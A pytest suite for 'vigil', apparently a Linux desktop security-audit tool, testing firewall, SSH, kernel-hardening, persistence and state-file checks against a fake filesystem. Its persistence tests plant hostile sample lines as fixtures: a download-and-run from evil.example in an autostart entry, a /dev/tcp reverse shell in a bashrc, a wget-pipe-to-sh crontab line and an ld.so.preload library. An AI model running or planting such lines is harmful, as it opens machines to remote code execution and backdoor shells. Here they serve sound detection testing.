"""Tests for bin/vigil. Run with: python3 -m pytest tests -q

Every check runs against a fake filesystem under tmp_path: vigil.ROOT is the
prefix for /etc, /proc, /sys and /var, vigil.HOME is a fake home directory,
and systemctl / child processes are replaced with fakes.
"""
import base64
import importlib.machinery
import importlib.util
import json
import os
import re
import stat
import struct
import threading
from pathlib import Path

import sys

import pytest

sys.dont_write_bytecode = True          # keep bin/ free of __pycache__
REPO = Path(__file__).resolve().parents[1]


def load_vigil():
    loader = importlib.machinery.SourceFileLoader("vigil", str(REPO / "bin" / "vigil"))
    spec = importlib.util.spec_from_loader("vigil", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def v(tmp_path, monkeypatch):
    mod = load_vigil()
    root = tmp_path / "root"
    home = tmp_path / "home"
    root.mkdir()
    home.mkdir(mode=0o700)
    mod.ROOT = str(root)
    mod.HOME = str(home)
    mod.USER = "alice"
    units = {}
    mod.UNITS = units

    def fake_systemctl(*args):
        if args[0] in ("is-active", "is-enabled"):
            return units.get((args[0], args[1]), "inactive" if args[0] == "is-active" else "disabled")
        return ""

    # Replace the memoised wrapper itself, so tests can change units mid-test.
    monkeypatch.setattr(mod, "systemctl", fake_systemctl)
    commands = {}
    mod.COMMANDS = commands

    def fake_run(argv, timeout=8, limit=0):
        key = tuple(argv)
        if key in commands:
            return commands[key]
        return None, ""

    monkeypatch.setattr(mod, "run", fake_run)
    trusted = set()
    mod.TRUSTED = trusted
    monkeypatch.setattr(mod, "is_trusted_executable", lambda p: p in trusted)
    return mod


def put(path, text, mode=0o644):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    os.chmod(path, mode)
    return path


def sysfile(v, rel, text, mode=0o644):
    return put(v.ROOT + rel, text, mode)


def homefile(v, rel, text, mode=0o644):
    return put(os.path.join(v.HOME, rel), text, mode)


# --------------------------------------------------------------------------
# Safe file reading

def test_read_file_refuses_symlink(v, tmp_path):
    target = put(tmp_path / "secret", "x")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(v.Refused):
        v.read_file(str(link))
    assert v.read_file(str(link), follow=True) == b"x"


def test_read_file_does_not_hang_on_fifo(v, tmp_path):
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    done = []

    def go():
        try:
            v.read_file(str(fifo), follow=True)
        except v.Refused:
            done.append("refused")

    t = threading.Thread(target=go, daemon=True)
    t.start()
    t.join(3)
    assert done == ["refused"]


def test_read_file_rejects_oversize(v, tmp_path):
    p = put(tmp_path / "big", "a" * 101)
    with pytest.raises(v.Refused):
        v.read_file(str(p), limit=100)
    assert v.read_file(str(p), limit=101) == b"a" * 101


def test_read_file_missing_is_none(v, tmp_path):
    assert v.read_file(str(tmp_path / "nope")) is None


def test_clean_strips_controls_and_caps(v):
    s = v.clean("a\x1b[31mb‮c" + "x" * 500, 20)
    assert "\x1b" not in s and "‮" not in s and len(s) <= 20


# --------------------------------------------------------------------------
# Running commands (real subprocesses)

def test_run_rejects_relative_argv():
    mod = load_vigil()
    assert mod.run(["sh", "-c", "true"]) == (None, "")


def test_run_caps_output():
    mod = load_vigil()
    rc, out = mod.run(["/usr/bin/yes"], timeout=5, limit=1000)
    assert rc is None and out == ""


def test_run_times_out():
    mod = load_vigil()
    rc, _ = mod.run(["/usr/bin/sleep", "5"], timeout=0.5)
    assert rc is None


def test_run_ok():
    mod = load_vigil()
    assert mod.run(["/usr/bin/printf", "hi"]) == (0, "hi")


# --------------------------------------------------------------------------
# Harden checks

def ufw(v, enabled="yes", policy="DROP", active="active"):
    sysfile(v, "/etc/ufw/ufw.conf", "ENABLED=%s\n" % enabled)
    sysfile(v, "/etc/default/ufw", 'DEFAULT_INPUT_POLICY="%s"\n' % policy)
    sysfile(v, "/usr/bin/ufw", "")
    v.UNITS[("is-active", "ufw.service")] = active


def test_firewall_pass(v):
    ufw(v)
    assert v.check_firewall()["status"] == "pass"


def test_firewall_off(v):
    ufw(v, enabled="no", active="inactive")
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "firewall-on"


def test_firewall_accepting(v):
    ufw(v, policy="ACCEPT")
    assert v.check_firewall()["status"] == "warn"


def test_firewall_missing(v):
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "install-ufw"


def test_firewall_nftables_counts(v):
    v.UNITS[("is-active", "nftables.service")] = "active"
    assert v.check_firewall()["status"] == "pass"


def test_kernel_sysctl(v):
    for name, _, rec, _ in v.KERNEL_SYSCTLS:
        sysfile(v, "/proc/sys/" + name.replace(".", "/"), "%d\n" % rec)
    assert v.check_kernel_sysctl()["status"] == "pass"
    sysfile(v, "/proc/sys/kernel/kptr_restrict", "0\n")
    c = v.check_kernel_sysctl()
    assert c["status"] == "warn" and "kptr_restrict" in c["detail"] and c["fix"]["action"] == "sysctl-harden"


def test_kernel_sysctl_unreadable(v):
    assert v.check_kernel_sysctl()["status"] == "unknown"


def test_llmnr(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_llmnr()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nLLMNR=no\n")
    assert v.check_llmnr()["status"] == "pass"


def test_ssh_server_off(v):
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_dropin_wins(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config", "PasswordAuthentication yes\nPermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "fail"
    sysfile(v, "/etc/ssh/sshd_config.d/00-a.conf",
            "PermitRootLogin no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n")
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_ignores_match_blocks(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config",
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nMatch User bob\n  PermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "pass"


def ssh_string(b):
    return struct.pack(">I", len(b)) + b


def openssh_key(cipher=b"none", ktype=b"ssh-ed25519"):
    pub = ssh_string(ktype) + ssh_string(b"\x00" * 32)
    blob = (b"openssh-key-v1\x00" + ssh_string(cipher) + ssh_string(b"none" if cipher == b"none" else b"bcrypt")
            + ssh_string(b"") + struct.pack(">I", 1) + ssh_string(pub) + ssh_string(b"\x00" * 64))
    body = base64.b64encode(blob).decode()
    return "-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----\n" % body


def test_private_key_parser(v):
    assert v._private_key_state(openssh_key().encode())[:2] == (True, False)
    assert v._private_key_state(openssh_key(b"aes256-ctr").encode())[:2] == (True, True)
    assert v._private_key_state(openssh_key(ktype=b"sk-ssh-ed25519@openssh.com").encode())[:2] == (True, True)
    pem = "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nabc\n-----END RSA PRIVATE KEY-----\n"
    assert v._private_key_state(pem.encode())[:2] == (True, True)
    assert v._private_key_state(b"-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n")[:2] == (True, False)
    assert v._private_key_state(b"ssh-ed25519 AAAA user@host\n")[0] is False
    # Truncated or garbage blobs never raise.
    assert v._private_key_state(b"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END")[0] is True


def test_ssh_keys_statuses(v):
    assert v.check_ssh_keys()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o700)
    homefile(v, ".ssh/id_ed25519", openssh_key(b"aes256-ctr"), 0o600)
    homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    assert v.check_ssh_keys()["status"] == "pass"
    homefile(v, ".ssh/id_work", openssh_key(), 0o600)
    assert v.check_ssh_keys()["status"] == "warn"
    os.chmod(os.path.join(v.HOME, ".ssh/id_work"), 0o644)
    c = v.check_ssh_keys()
    assert c["status"] == "fail" and c["fix"]["action"] == "ssh-perms"


def test_fix_ssh_perms_only_touches_keys_and_never_follows_links(v, tmp_path):
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o755)
    key = homefile(v, ".ssh/id_ed25519", openssh_key(), 0o644)
    pub = homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    outside = put(tmp_path / "outside_key", openssh_key(), 0o644)
    os.symlink(outside, os.path.join(v.HOME, ".ssh", "linked"))
    res = v.run_fix("ssh-perms")
    assert res["ok"], res
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".ssh")).st_mode) == 0o700
    assert stat.S_IMODE(key.stat().st_mode) == 0o600
    assert stat.S_IMODE(pub.stat().st_mode) == 0o644
    assert stat.S_IMODE(outside.stat().st_mode) == 0o644


def test_fix_refuses_symlinked_ssh_dir(v, tmp_path):
    real = tmp_path / "elsewhere"
    real.mkdir(mode=0o755)
    os.symlink(real, os.path.join(v.HOME, ".ssh"))
    res = v.run_fix("ssh-perms")
    assert not res["ok"]
    assert stat.S_IMODE(real.stat().st_mode) == 0o755


def test_gnupg(v):
    assert v.check_gnupg()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".gnupg"), 0o755)
    os.chmod(os.path.join(v.HOME, ".gnupg"), 0o755)
    assert v.check_gnupg()["status"] == "warn"
    assert v.run_fix("gnupg-perms")["ok"]
    assert v.check_gnupg()["status"] == "pass"


def test_screen_lock(v):
    assert v.check_screen_lock()["status"] == "unknown"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    assert v.check_screen_lock()["status"] == "pass"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 3600}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    homefile(v, ".local/state/omarchy/indicators/stay-awake", "")
    c = v.check_screen_lock()
    assert c["status"] == "warn" and c["fix"]["action"] == "allow-idle"


def test_faillock(v):
    assert v.check_faillock()["status"] == "na"
    sysfile(v, "/etc/pam.d/system-auth",
            "auth required pam_faillock.so preauth silent deny=10 unlock_time=120\n")
    c = v.check_faillock()
    assert c["status"] == "pass" and "10" in c["summary"]
    sysfile(v, "/etc/pam.d/system-auth", "auth required pam_unix.so\n")
    assert v.check_faillock()["status"] == "warn"


def test_passwordless_sudo(v):
    assert v.check_passwordless_sudo()["status"] == "na"
    v.TRUSTED.add(v.ROOT + "/usr/bin/omarchy-sudo-passwordless")
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (0, "")
    assert v.check_passwordless_sudo()["status"] == "fail"
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (1, "")
    assert v.check_passwordless_sudo()["status"] == "pass"


def test_docker_group(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\ndocker:x:970:bob,alice\n")
    assert v.check_docker_group()["status"] == "warn"
    sysfile(v, "/etc/group", "docker:x:970:bob,alicex\n")
    assert v.check_docker_group()["status"] == "pass"


def test_updates(v):
    import time as _t
    today = _t.strftime("%Y-%m-%d")
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % today)
    assert v.check_updates()["status"] == "pass"
    sysfile(v, "/var/log/pacman.log", "[2020-01-01T10:00:00+0000] [PACMAN] starting full system upgrade\n")
    assert v.check_updates()["status"] == "fail"


def test_disk_encryption_reads_dm_uuid(v, tmp_path, monkeypatch):
    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
    sysfile(v, "/dev/mapper/root", "")

    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
    assert v.check_disk_encryption()["status"] == "pass"
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
    assert v.check_disk_encryption()["status"] == "fail"
    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
    assert v.check_disk_encryption()["status"] == "pass"


def test_listeners_skip_loopback(v):
    tcp = ("  sl  local_address rem_address   st\n"
           "   0: 0100007F:0277 00000000:0000 0A\n"          # 127.0.0.1:631
           "   1: 3500007F:0035 00000000:0000 0A\n"          # 127.0.0.53:53
           "   2: 00000000:0016 00000000:0000 0A\n"          # 0.0.0.0:22
           "   3: 00000000:1F90 00000000:0000 01\n")         # established, ignored
    tcp6 = ("  sl  local_address rem_address st\n"
            "   0: 00000000000000000000000001000000:1F90 00000000000000000000000000000000:0000 0A\n"
            "   1: 00000000000000000000000000000000:D125 00000000000000000000000000000000:0000 0A\n")
    sysfile(v, "/proc/net/tcp", tcp)
    sysfile(v, "/proc/net/tcp6", tcp6)
    assert v._listeners() == [("tcp", 22), ("tcp", 53541)]
    c = v.check_listeners()
    assert c["status"] == "warn" and "22" in c["detail"]


# --------------------------------------------------------------------------
# Scan checks

def test_persistence_flags_download_and_run(v):
    homefile(v, ".bashrc", "# curl https://x | sh is fine in a comment\nalias ll='ls -l'\n")
    assert v.check_persistence()["status"] == "pass"
    homefile(v, ".config/autostart/updater.desktop",
             "[Desktop Entry]\nExec=sh -c 'curl -fsSL https://evil.example/x | bash'\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "autostart/updater.desktop:2" in c["detail"]


def test_persistence_follows_dotfile_symlink(v, tmp_path):
    real = put(tmp_path / "dotfiles" / "bashrc", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    os.symlink(real, os.path.join(v.HOME, ".bashrc"))
    assert v.check_persistence()["status"] == "warn"


def test_persistence_crontab(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/crontab")
    v.COMMANDS[("/usr/bin/crontab", "-l")] = (0, "*/5 * * * * wget -qO- http://x/y | sh\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "crontab:1" in c["detail"]


def test_ld_preload(v):
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "# comment\n")
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    assert v.check_ld_preload()["status"] == "fail"


def test_scanner_rows(v):
    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
    assert c["status"] == "info" and c["fix"]["action"] == "install-clamav"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    c = v.CHECKS[[f.__name__ for f in v.CHECKS].index("check_scanner_clamav")]()
    assert c["status"] == "info" and c["fix"]["action"] == "scan-downloads"


# --------------------------------------------------------------------------
# Privacy checks

def test_dns_fallback(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_dns_fallback()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nFallbackDNS=\n")
    assert v.check_dns_fallback()["status"] == "pass"


def test_connectivity_and_mac(v):
    v.UNITS[("is-active", "NetworkManager.service")] = "active"
    sysfile(v, "/usr/lib/NetworkManager/conf.d/20-connectivity.conf",
            "[connectivity]\nuri=http://ping.archlinux.org/nm-check.txt\n")
    assert v.check_connectivity_check()["status"] == "info"
    sysfile(v, "/etc/NetworkManager/conf.d/90-x.conf", "[connectivity]\nenabled=false\n")
    assert v.check_connectivity_check()["status"] == "pass"
    assert v.check_mac_randomization()["status"] == "warn"
    sysfile(v, "/etc/NetworkManager/conf.d/91-x.conf", "[connection]\nwifi.cloned-mac-address=stable\n")
    assert v.check_mac_randomization()["status"] == "pass"


def test_avahi(v):
    assert v.check_avahi()["status"] == "pass"
    v.UNITS[("is-active", "avahi-daemon.service")] = "active"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\n#disable-publishing=no\n")
    assert v.check_avahi()["status"] == "warn"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\ndisable-publishing=yes\n")
    assert v.check_avahi()["status"] == "pass"


def test_optout_roundtrip(v):
    assert v.check_opt_out()["status"] == "info"
    assert v.run_fix("optout-on")["ok"]
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    assert path.read_text() == v.OPT_OUT_TEXT
    assert v.check_opt_out()["fix"]["action"] == "optout-off"
    assert v.run_fix("optout-off")["ok"]
    assert not path.exists()


def test_optout_off_leaves_edited_file(v):
    v.run_fix("optout-on")
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    path.write_text(v.OPT_OUT_TEXT + "export MINE=1\n")
    res = v.run_fix("optout-off")
    assert not res["ok"] and path.exists()


def test_optout_on_does_not_write_through_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".config/uwsm/env.d")
    d.mkdir(parents=True)
    os.symlink(victim, d / v.OPT_OUT_NAME)
    assert v.run_fix("optout-on")["ok"]
    assert victim.read_text() == "must survive"
    assert not (d / v.OPT_OUT_NAME).is_symlink()


# --------------------------------------------------------------------------
# Clean

def test_clean_thumbnails_stays_inside(v, tmp_path):
    keep = tmp_path / "keep"
    keep.mkdir()
    put(keep / "precious.png", "x")
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "large" / "a.png", "x")
    put(thumbs / "normal" / "b.png", "x")
    os.symlink(keep, thumbs / "escape")
    res = v.run_fix("clean-thumbnails")
    assert res["ok"], res
    assert (keep / "precious.png").exists()
    assert list(thumbs.iterdir()) == []


def test_size_checks(v):
    assert v.check_thumbnails()["status"] == "pass"
    put(Path(v.HOME, ".cache/thumbnails/normal/a.png"), "x" * 10000)
    c = v.check_thumbnails()
    assert c["status"] == "info" and c["fix"]["action"] == "clean-thumbnails"


def test_unknown_fix_refused(v):
    assert v.run_fix("rm-rf")["ok"] is False


# --------------------------------------------------------------------------
# State

def test_state_reports_new_findings_after_baseline(v):
    ufw(v, enabled="no", active="inactive")
    first = v.audit()
    assert first["stateSaved"] and first["new"] == []
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    second = v.audit()
    assert "ld-preload" in second["new"] and "firewall" not in second["new"]
    assert v.audit()["new"] == []
    st = os.stat(os.path.join(v.HOME, ".local/state/omarchy-vigil/state.json"))
    assert stat.S_IMODE(st.st_mode) == 0o600


def test_peek_does_not_touch_state(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil"))


def test_state_write_replaces_planted_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(victim, d / "state.json")
    v.audit()
    assert victim.read_text() == "must survive"


def test_state_refuses_symlinked_directory(v, tmp_path):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    Path(v.HOME, ".local/state").mkdir(parents=True)
    os.symlink(elsewhere, Path(v.HOME, ".local/state/omarchy-vigil"))
    report = v.audit()
    assert report["stateSaved"] is False
    assert list(elsewhere.iterdir()) == []


# --------------------------------------------------------------------------
# Report shape and the contract with Model.js

def model_actions():
    src = (REPO / "Model.js").read_text()
    terminal = set(re.findall(r'^  "([a-z0-9-]+)": \{\n    title:', src, re.M))
    helper = set(re.findall(r'"([a-z0-9-]+)"', re.search(r"var HELPER_ACTIONS = \[(.*?)\]", src).group(1)))
    return terminal, helper


def test_every_fix_in_helper_is_known_to_model(v):
    terminal, helper = model_actions()
    src = (REPO / "bin" / "vigil").read_text()
    used_terminal = set(re.findall(r'"terminal", "([a-z0-9-]+)"', src))
    used_helper = set(re.findall(r'"helper", "([a-z0-9-]+)"', src))
    used_app = set(re.findall(r'"app", "([a-z0-9-]+)"', src))
    msrc = (REPO / "Model.js").read_text()
    for a in used_app:
        assert '"%s": {\n    app:' % a in msrc, a
    for spec in v.SCANNERS:
        used_terminal |= {spec[5], spec[6]}
    assert used_terminal <= terminal, used_terminal - terminal
    assert used_helper <= helper, used_helper - helper
    assert helper == set(v.FIXES)


def test_full_audit_shape(v):
    report = v.audit()
    json.dumps(report)
    ids = [c["id"] for c in report["checks"]]
    assert len(ids) == len(set(ids)) and len(ids) <= 80
    for c in report["checks"]:
        assert re.fullmatch(r"[a-z0-9-]{1,40}", c["id"])
        assert c["category"] in ("harden", "detect", "supply", "privacy", "care")
        assert c["status"] in ("pass", "warn", "fail", "info", "na", "unknown")
        assert c["fix"]["kind"] in ("terminal", "helper", "none")
        assert isinstance(c["weight"], int) and 0 <= c["weight"] <= 3
        assert len(c["summary"]) <= 240 and len(c["why"]) <= 400
    assert 0 <= report["score"] <= 100


def test_cli_rejects_bad_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["fix", "../../x"], ["fix"], ["audit", "--force"], []):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Pillars: ClamUI hand-off, Bumblebee, plugin inventory

def test_categories_match_pillars(v):
    cats = {c["category"] for c in v.audit(peek=True)["checks"]}
    assert cats == {"harden", "detect", "supply", "privacy", "care"}


def test_clamui_detection(v):
    c = v.check_clamui()
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "install-clamui", "label": "Install ClamUI"}
    v.TRUSTED.add(v.ROOT + "/usr/bin/flatpak")
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == "flatpak"
    c = v.check_clamui()
    assert c["status"] == "pass" and c["fix"]["kind"] == "app" and c["fix"]["action"] == "open-clamui"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.clamui_install() == "native"
    assert v.audit(peek=True)["apps"] == {"clamui": "native"}


def test_flatpak_clamui_needs_trusted_flatpak(v):
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == ""


def bumblebee(v, payload, raw=None):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID), exist_ok=True)
    homefile(v, ".local/state/omarchy/bumblebee/last-scan.json", raw if raw is not None else json.dumps(payload), 0o600)


def test_bumblebee_states(v):
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["weight"] == 0
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    assert v.check_bumblebee()["status"] == "unknown"
    bumblebee(v, {"ok": True, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "pass"
    bumblebee(v, {"ok": True, "exposure_count": 2})
    c = v.check_bumblebee()
    assert c["status"] == "fail" and "2 known-compromised" in c["summary"]
    bumblebee(v, {"ok": False, "exposure_count": 0})
    assert v.check_bumblebee()["status"] == "unknown"
    for bad in ({"ok": True, "exposure_count": True}, {"ok": True, "exposure_count": -1},
                {"ok": True, "exposure_count": "3"}, ["x"]):
        bumblebee(v, bad)
        assert v.check_bumblebee()["status"] == "unknown", bad
    bumblebee(v, None, raw="{not json")
    assert v.check_bumblebee()["status"] == "unknown"


def test_bumblebee_stale(v):
    bumblebee(v, {"ok": True, "exposure_count": 0})
    p = os.path.join(v.HOME, ".local/state/omarchy/bumblebee/last-scan.json")
    old = os.path.getmtime(p) - 10 * 86400
    os.utime(p, (old, old))
    assert v.check_bumblebee()["status"] == "warn"


def test_bumblebee_refuses_symlinked_cache(v, tmp_path):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID))
    real = put(tmp_path / "fake.json", json.dumps({"ok": True, "exposure_count": 0}))
    d = Path(v.HOME, ".local/state/omarchy/bumblebee")
    d.mkdir(parents=True)
    os.symlink(real, d / "last-scan.json")
    assert v.check_bumblebee()["status"] == "unknown"


def test_bumblebee_oversized_cache(v):
    bumblebee(v, None, raw='{"ok": true, "exposure_count": 0, "pad": "' + "x" * 70000 + '"}')
    assert v.check_bumblebee()["status"] == "unknown"


def test_plugin_inventory(v):
    assert v.check_plugins()["status"] == "pass"
    base = os.path.join(v.HOME, ".config/omarchy/plugins")
    homefile(v, ".config/omarchy/plugins/acme.weather/manifest.json", json.dumps({"name": "<b>Weather</b>"}))
    homefile(v, ".config/omarchy/plugins/keasbeexd.vigil/manifest.json", json.dumps({"name": "Vigil"}))
    os.makedirs(os.path.join(base, "broken.plugin"))
    c = v.check_plugins()
    assert c["status"] == "info" and "2 third-party plugins" in c["summary"]
    assert "Vigil" not in c["detail"] and "acme.weather" in c["detail"] and "broken.plugin" in c["detail"]


# --------------------------------------------------------------------------
# Undo, reviewed warnings, score history

def test_etc_mark_matches_model(v):
    src = (REPO / "Model.js").read_text()
    assert 'var VIGIL_MARK = "%s"' % v.ETC_MARK in src


def test_undo_offered_only_for_vigil_owned_files(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    path = "/etc/systemd/resolved.conf.d/90-omarchy-vigil-llmnr.conf"
    sysfile(v, path, v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["status"] == "pass" and llmnr["undo"]["action"] == "undo-llmnr"
    sysfile(v, path, "# edited by hand\n" + v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["undo"]["action"] == ""


def test_undo_never_follows_symlink(v, tmp_path):
    real = put(tmp_path / "x.conf", "")
    real.write_text(v.ETC_MARK + "\n")
    os.makedirs(v.ROOT + "/etc/sysctl.d")
    os.symlink(real, v.ROOT + "/etc/sysctl.d/90-omarchy-vigil.conf")
    assert v.undo_available("undo-sysctl") is False


def test_sysctl_undo_shows_on_both_sysctl_checks(v):
    sysfile(v, "/etc/sysctl.d/90-omarchy-vigil.conf", v.ETC_MARK + "\nkernel.kptr_restrict=2\n")
    checks = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert checks["kernel-hardening"]["undo"]["action"] == "undo-sysctl"
    assert checks["network-hardening"]["undo"]["action"] == "undo-sysctl"


def test_avahi_undo_needs_backup(v):
    assert v.undo_available("undo-avahi") is False
    sysfile(v, v.AVAHI_BACKUP, "[publish]\n")
    assert v.undo_available("undo-avahi") is True


def port_listening(v):
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n")


def test_dismiss_warning_roundtrip(v):
    port_listening(v)
    before = v.audit()
    ports = {c["id"]: c for c in before["checks"]}["open-ports"]
    assert ports["status"] == "warn" and ports["dismissible"] and not ports["dismissed"]
    res = v.set_dismissed("open-ports", True)
    assert res["ok"], res
    after = v.audit()
    ports = {c["id"]: c for c in after["checks"]}["open-ports"]
    assert ports["dismissed"] and re.fullmatch(r"\d{4}-\d{2}-\d{2}", ports["dismissedAt"])
    assert after["score"] > before["score"] and after["counts"]["dismissed"] == 1
    assert v.set_dismissed("open-ports", False)["ok"]
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_dismissal_lapses_when_finding_changes(v):
    port_listening(v)
    v.audit()
    v.set_dismissed("open-ports", True)
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n"
                                "   1: 00000000:1F90 00000000:0000 0A\n")
    report = v.audit()
    ports = {c["id"]: c for c in report["checks"]}["open-ports"]
    assert not ports["dismissed"] and "open-ports" in report["new"]


def test_failures_and_evidence_cannot_be_dismissed(v):
    ufw(v, enabled="no", active="inactive")
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("firewall", True)["ok"] is False
    assert v.set_dismissed("ld-preload", True)["ok"] is False
    assert v.set_dismissed("nonexistent", True)["ok"] is False
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert c["firewall"]["dismissible"] is False and c["llmnr"]["dismissible"] is True


def test_dismissed_finding_does_not_notify(v):
    v.audit()                                    # baseline
    port_listening(v)
    v.set_dismissed("open-ports", True)
    assert "open-ports" not in v.audit()["new"]


def test_forged_dismissal_entries_are_ignored(v):
    port_listening(v)
    v.audit()
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["dismissed"] = [{"fp": "../../etc", "at": "x"}, "junk", {"fp": "open-ports:zz"}]
    p.write_text(json.dumps(state))
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_history_is_daily_and_capped(v):
    v.audit()
    v.audit()
    report = v.audit()
    assert len(report["history"]) == 1 and report["history"][0]["score"] == report["score"]
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["history"] = [{"at": "2026-01-%02dT10:00:00+0000" % d, "score": 50 + d} for d in range(1, 32)] + \
                       [{"at": "bad", "score": 1}, {"at": "2026-02-01", "score": 900}, {"at": "2026-02-02", "score": True}]
